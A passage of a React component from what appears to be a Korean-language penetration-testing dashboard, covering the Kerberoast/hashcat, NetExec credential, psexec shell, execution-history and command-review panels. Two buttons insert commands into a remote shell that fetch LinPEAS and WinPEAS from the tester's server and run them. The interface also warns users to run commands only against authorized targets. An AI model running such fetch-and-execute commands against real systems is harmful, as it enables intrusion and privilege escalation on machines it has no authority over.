                  <button onClick={() => void openHashcatShell()}>
                    Kerberoast 해시 → hashcat 명령 준비
                  </button>
                </div>
              )}
              {netexecSuccess && netexecCredentialResult?.id && (
                <div className="netexecEvidence">
                  <button onClick={() => void captureEvidence(
                    {id: netexecCredentialResult.id!,
                     stdout: netexecCredentialResult.stdout,
                     stderr: netexecCredentialResult.stderr},
                    `${netexecProtocol?.toUpperCase()} 자격증명 검증 · ${netexecUsername}`,
                    "sensitive")}>
                    Evidence로 저장
                  </button>
                  <button onClick={() => void promoteToFinding(
                    {id: netexecCredentialResult.id!,
                     stdout: netexecCredentialResult.stdout,
                     stderr: netexecCredentialResult.stderr},
                    `${netexecProtocol?.toUpperCase()} 유효 자격증명 · ${netexecUsername}`,
                    `${target?.ip} ${service?.port}/${service?.name}에 대해 ` +
                    `${netexecDomain ? netexecDomain + "\\" : ""}${netexecUsername} 계정으로 ` +
                    `NetExec ${netexecProtocol} 인증에 성공함.`, "sensitive")}>
                    Finding(Draft)으로 승격
                  </button>
                  {evidenceMsg && <span>{evidenceMsg}</span>}
                </div>
              )}
            </section>
          )}
          {psexecSession && (
            <>
              <section className="privescServer" aria-labelledby="privesc-server-heading">
                <header>
                  <h2 id="privesc-server-heading">권한 상승 스크립트 서버 (LinPEAS/WinPEAS)</h2>
                  <small>{privescServer?.running
                    ? `tun0에서 서비스 중 · ${privescServer.base_url}`
                    : "대상이 접근할 수 있도록 tun0에만 임시 파일서버를 엽니다."}</small>
                </header>
                <div className="privescServerActions">
                  <button disabled={privescServerBusy} onClick={togglePrivescServer}>
                    {privescServerBusy ? "처리 중…"
                      : privescServer?.running ? "서버 중지" : "서버 시작"}
                  </button>
                  <button disabled={!privescServer?.running}
                    onClick={() => void sendPrivescCommand(
                      `curl -sS ${privescServer?.base_url}/linpeas/linpeas.sh | bash`)}>
                    LinPEAS 명령 셸에 입력
                  </button>
                  <button disabled={!privescServer?.running}
                    onClick={() => void sendPrivescCommand(
                      `curl.exe -o winpeas.exe ${privescServer?.base_url}` +
                      `/winpeas/winPEASany.exe && .\\winpeas.exe`)}>
                    WinPEAS 명령 셸에 입력
                  </button>
                </div>
              </section>
              <InteractiveTerminal sessionId={psexecSession.id}
                title="impacket-psexec · 검토 후 Enter"
                initialInput={psexecSession.command}
                inputRequest={psexecInputRequest}
                onClose={() => setPsexecSession(undefined)} />
            </>
          )}
          <div className="terminal">
            <div className={`terminalStatus${runState ? ` terminalStatus--${runState.status}` : ""}`}>
              <span aria-hidden="true" />
              <b>실시간 출력</b>
              <small role="status" aria-live="polite">
                {!runState
                  ? "명령 실행 대기"
                  : `${runState.name} · ${statusLabel[runState.status] ||
                    (runState.status === "starting" ? "실행 준비 중" : runState.status)} · ${runElapsed}초${
                    runState.exitCode == null ? "" : ` · 종료 코드 ${runState.exitCode}`
                  }`}
              </small>
            </div>
            {runState?.message && <p className="terminalError">{runState.message}</p>}
            {currentOutcome && (
              <div className={`executionOutcome executionOutcome--${currentOutcome.tone}`}>
                <b>{currentOutcome.title}</b>
                <span>{currentOutcome.detail}</span>
              </div>
            )}
            <pre>{output}</pre>
          </div>
        </section>
        <aside ref={notesRef} className={`notes${notesCollapsed ? " isCollapsed" : ""}`}
          style={{"--workspace-height": `${workspaceHeight}px`} as CSSProperties}>
          <button
            className="panelDockToggle panelDockToggle--notes"
            type="button"
            aria-label={notesCollapsed ? "실행 및 메모 패널 펼치기" : "실행 및 메모 패널 접기"}
            aria-expanded={!notesCollapsed}
            title={notesCollapsed ? "실행 및 메모 패널 펼치기" : "실행 및 메모 패널 접기"}
            onClick={() => setNotesCollapsed((collapsed) => {
              localStorage.setItem("oscp-execution-panel-collapsed", String(!collapsed));
              return !collapsed;
            })}
          >{notesCollapsed ? "‹" : "›"}</button>
          {!notesCollapsed && <div
            className="notesResizeHandle"
            role="separator"
            aria-label="실행 결과 패널 너비 조절"
            aria-orientation="vertical"
            aria-valuemin={285}
            aria-valuemax={720}
            aria-valuenow={notesWidth}
            tabIndex={0}
            onPointerDown={beginNotesResize}
            onPointerMove={resizeNotes}
            onPointerUp={finishNotesResize}
            onPointerCancel={finishNotesResize}
            onKeyDown={(event) => {
              if (!["ArrowLeft", "ArrowRight"].includes(event.key)) return;
              event.preventDefault();
              const direction = event.key === "ArrowLeft" ? 1 : -1;
              applyNotesWidth(notesWidth + direction * 24);
            }}
            onWheel={(event) => {
              event.preventDefault();
              applyNotesWidth(notesWidth + (event.deltaY < 0 ? 16 : -16));
            }}
          />}
          <section className="executionPanel">
            <div className="panelTitle">
              <span>실행 이력</span>
              <em>{serviceExecutions.length}개</em>
            </div>
            <div className="executionTabs" role="tablist" aria-label="실행 이력 보기">
              <button role="tab" aria-selected={executionView === "list"}
                onClick={() => setExecutionView("list")}>목록</button>
              <button role="tab" aria-selected={executionView === "detail"}
                disabled={!selectedExecution}
                onClick={() => setExecutionView("detail")}>상세보기</button>
            </div>
            {executionView === "list" ? (
              <div className="executionHistory">
                {serviceExecutions.map((x) => (
                <button key={x.id} onClick={() => openExecution(x.id)}>
                  <b>
                    #{x.id} {x.template_id}
                  </b>
                  <small>
                    {statusLabel[x.status] || x.status}
                    {x.exit_code == null ? "" : ` · exit ${x.exit_code}`}
                  </small>
                </button>
              ))}
                {!serviceExecutions.length && <p>아직 실행 기록이 없습니다.</p>}
              </div>
            ) : selectedExecution ? (
              <div className="executionDetail">
                <header>
                  <b>#{selectedExecution.id} {selectedExecution.template_id}</b>
                  <span>{statusLabel[executionDetail?.status ||
                    selectedExecution.status] || selectedExecution.status}</span>
                </header>
                {selectedOutcome && (
                  <div className={`executionOutcome executionOutcome--${selectedOutcome.tone}`}>
                    <b>{selectedOutcome.title}</b>
                    <span>{selectedOutcome.detail}</span>
                  </div>
                )}
                <dl>
                  <div><dt>시작</dt><dd>{new Date(
                    selectedExecution.started_at).toLocaleString()}</dd></div>
                  <div><dt>종료</dt><dd>{selectedExecution.ended_at
                    ? new Date(selectedExecution.ended_at).toLocaleString()
                    : "실행 중"}</dd></div>
                  <div><dt>종료 코드</dt><dd>{executionDetail?.exit_code ??
                    selectedExecution.exit_code ?? "—"}</dd></div>
                </dl>
                <code>{selectedExecution.command}</code>
                {executionDetail?.stdout && (
                  <details open>
                    <summary>표준 출력</summary>
                    <pre>{executionDetail.stdout}</pre>
                  </details>
                )}
                {executionDetail?.stderr && (
                  <details>
                    <summary>오류 출력</summary>
                    <pre>{executionDetail.stderr}</pre>
                  </details>
                )}
                {!executionDetail?.stdout && !executionDetail?.stderr && (
                  <p>저장된 출력이 없습니다.</p>
                )}
                {["queued", "running"].includes(
                  executionDetail?.status || selectedExecution.status,
                ) && (
                  <button className="executionStop" onClick={stopSavedExecution}>
                    실행 중단
                  </button>
                )}
              </div>
            ) : null}
          </section>
          {!workspaceCollapsed && <div
            className="workspaceResizeHandle"
            role="separator"
            aria-label="실행 이력과 서비스 작업 공간 높이 조절"
            aria-orientation="horizontal"
            aria-valuemin={180}
            aria-valuemax={workspaceHeightLimit()}
            aria-valuenow={workspaceHeight}
            tabIndex={0}
            onPointerDown={beginWorkspaceResize}
            onPointerMove={resizeWorkspace}
            onPointerUp={finishWorkspaceResize}
            onPointerCancel={finishWorkspaceResize}
            onWheel={(event) => {
              event.preventDefault();
              applyWorkspaceHeight(workspaceHeight + (event.deltaY < 0 ? 18 : -18));
            }}
            onKeyDown={(event) => {
              if (!["ArrowUp", "ArrowDown", "Home", "End"].includes(event.key)) return;
              event.preventDefault();
              if (event.key === "Home") applyWorkspaceHeight(180);
              else if (event.key === "End") applyWorkspaceHeight(workspaceHeightLimit());
              else applyWorkspaceHeight(workspaceHeight + (event.key === "ArrowUp" ? 24 : -24));
            }}
          />}
          <section className={`serviceWorkspacePanel${workspaceCollapsed ? " isCollapsed" : ""}`}>
            <div className="panelTitle">
              <span>서비스 작업 공간</span>
              <button type="button" className="workspaceCollapseButton"
                aria-expanded={!workspaceCollapsed}
                onClick={() => setWorkspaceCollapsed((collapsed) => {
                  localStorage.setItem("oscp-service-workspace-collapsed", String(!collapsed));
                  return !collapsed;
                })}>
                {workspaceCollapsed ? "펼치기 ↑" : "접기 ↓"}
              </button>
            </div>
            {!workspaceCollapsed && <div className="serviceWorkspaceBody">
            <div className="meta">
              <label>Hostname<b>{target?.hostname || "알 수 없음"}</b></label>
              <label>추정 OS<b>{target?.os_guess || "탐지되지 않음"}</b></label>
            </div>
            <h3>Enumeration 체크리스트</h3>
            {[
              "서비스 Banner 확인", "기본 Credential 정책 검토", "버전 증적 저장",
              "주요 경로 기록", "다음 수동 작업 계획",
            ].map((x, i) => (
              <label className="check" key={x}>
                <input type="checkbox" /><span>{x}</span><small>0{i + 1}</small>
              </label>
            ))}
            <h3>검토한 제품·버전</h3>
            <input value={serviceProduct} onChange={(e) => setServiceProduct(e.target.value)}
              placeholder="예: Linux telnetd" aria-label="검토한 서비스 제품" />
            <input value={serviceVersion} onChange={(e) => setServiceVersion(e.target.value)}
              placeholder="예: 0.17" aria-label="검토한 서비스 버전" />
            <h3>서비스 태그</h3>
            <input value={serviceTags} onChange={(e) => setServiceTags(e.target.value)}
              placeholder="web, reviewed" />
            <h3>서비스 메모</h3>
            <textarea value={serviceNotes} onChange={(e) => setServiceNotes(e.target.value)}
              placeholder="이 포트에 대한 Markdown 메모…" />
            <button onClick={saveService}
              disabled={!serviceId || serviceSaveState === "saving"}>
              {serviceSaveState === "saving" ? "저장 중…" :
                serviceSaveState === "saved" ? "저장됨" : "작업 공간 저장"}
            </button>
            {serviceSaveState === "error" && (
              <p className="webError" role="alert">
                제품·버전과 작업 공간을 저장하지 못했습니다.
              </p>
            )}
            <div className="warning">
              <b>실행 안내</b>
              <p>명령은 이 Kali 호스트에서 실행됩니다. 허가 범위와 최종 명령을 확인하세요.</p>
            </div>
            </div>}
          </section>
        </aside>
      </main>
      {runState && ["starting", "running"].includes(runState.status) && (
        <aside className="executionMonitor" aria-live="polite" aria-label="현재 실행 상태">
          <div className="executionMonitor__head">
            <span className="executionMonitor__pulse" aria-hidden="true" />
            <div>
              <b>{runState.name}</b>
              <small>
                {runState.status === "starting"
                  ? "실행 요청을 보내는 중"
                  : runProcessAlive
                    ? "프로세스 실행 확인됨"
                    : "프로세스 상태 확인 중"}
              </small>
            </div>
            <strong>{runElapsed < 60
              ? `${runElapsed}초`
              : `${Math.floor(runElapsed / 60)}분 ${runElapsed % 60}초`}</strong>
          </div>
          <div className="executionMonitor__track" aria-hidden="true"><span /></div>
          <div className="executionMonitor__meta">
            <span>작업 #{runState.id || "생성 중"}</span>
            <span>
              마지막 서버 응답{" "}
              {lastRunEventAt
                ? `${Math.max(0, Math.floor((clock - lastRunEventAt) / 1000))}초 전`
                : "대기 중"}
            </span>
            {runState.status === "running" && runState.id && (
              <button onClick={stopCurrentExecution}>작업 중단</button>
            )}
          </div>
          {lastRunEventAt && clock - lastRunEventAt > 30000 && (
            <p role="alert">30초 이상 상태 신호가 없습니다. 연결 또는 백엔드 상태를 확인하세요.</p>
          )}
        </aside>
      )}
      {confirm && (
        <div className="modal" role="presentation">
          <div
            role="dialog"
            aria-modal="true"
            aria-labelledby="command-review-title"
            aria-describedby="command-review-description"
          >
            <span>최종 명령 검토</span>
            <h2 id="command-review-title">{confirm.name}</h2>
            <p id="command-review-description">
              허가된 대상에서만 실행하세요. 대상과 전체 옵션을 확인한 뒤 실행 버튼을 누르세요.
            </p>
            <code>{runWithSudo ? `sudo ${confirm.preview}` : confirm.preview}</code>
            <label className="sudoOption">
              <input
                type="checkbox"
                checked={runWithSudo}
                onChange={(event) => setRunWithSudo(event.target.checked)}
              />
              sudo로 실행
            </label>
            {confirm.risk === "high" && (
              <p className="intrusiveConfirm">
                이 명령은 계정 잠금이나 인증 로그를 발생시킬 수 있습니다.
              </p>
            )}
            <footer>
              <button onClick={() => setConfirm(null)}>취소</button>
              <button
                className="danger"
                onClick={run}
              >
                명령 실행
              </button>
            </footer>
          </div>
        </div>
      )}
    </div>
  );
}
